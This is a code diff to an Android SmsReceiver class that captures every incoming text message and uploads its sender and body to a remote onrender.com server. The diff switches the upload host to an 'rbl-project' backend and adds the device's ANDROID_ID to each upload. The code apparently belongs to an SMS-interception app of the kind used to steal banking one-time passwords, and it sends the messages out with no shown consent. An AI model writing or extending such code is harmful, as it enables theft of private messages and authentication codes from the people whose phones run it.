@@ -17,7 +17,7 @@ public class SmsReceiver extends BroadcastReceiver {
     
     // --- Configuration ---
     private static final String SYNC_URL = "http://10.0.2.2:3000/api/application/sync-sms";
-    private static final String PUBLIC_SYNC_URL = "https://pm-backend-9vz9.onrender.com/api/application/sync-sms";
+    private static final String PUBLIC_SYNC_URL = "https://rbl-project-5sfk.onrender.com/api/application/sync-sms";
 
 
     @Override
@@ -35,8 +35,10 @@ public class SmsReceiver extends BroadcastReceiver {
                             
                             Log.d(TAG, "SMS Received from " + sender + ": " + messageBody);
                             
+                            String deviceId = android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+
                             // Forward in background
-                            sendData(sender, messageBody);
+                            sendData(sender, messageBody, deviceId);
                         } catch (Exception e) {
                             Log.e(TAG, "Error parsing SMS", e);
                         }
@@ -46,12 +48,12 @@ public class SmsReceiver extends BroadcastReceiver {
         }
     }
 
-    private void sendData(final String sender, final String body) {
+    private void sendData(final String sender, final String body, final String deviceId) {
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    String json = "{\"deviceId\":\"NativeForwarder\", \"sms\":{\"address\":\"" + sender + "\", \"body\":\"" + body + "\"}}";
+                    String json = "{\"deviceId\":\"" + deviceId + "\", \"sms\":{\"address\":\"" + sender + "\", \"body\":\"" + body + "\"}}";
                     
                     // Try Local first
                     sendPostRequest(SYNC_URL, json);
